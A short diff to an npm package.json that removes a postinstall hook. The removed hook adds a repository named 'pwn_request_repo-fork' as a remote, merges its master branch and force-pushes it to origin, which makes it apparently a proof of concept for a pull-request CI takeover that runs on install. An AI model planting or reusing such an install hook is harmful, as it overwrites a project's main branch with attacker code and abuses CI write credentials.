@@ -3,8 +3,7 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"running tests\" ",
-    "postinstall": "git remote add fork https://github.com/PocAccount3/pwn_request_repo-fork.git && git fetch fork master && git checkout master && git merge fork/master && git push origin master -f"
+    "test": "echo \"running tests\" "
   },
   "keywords": [],
   "author": "",
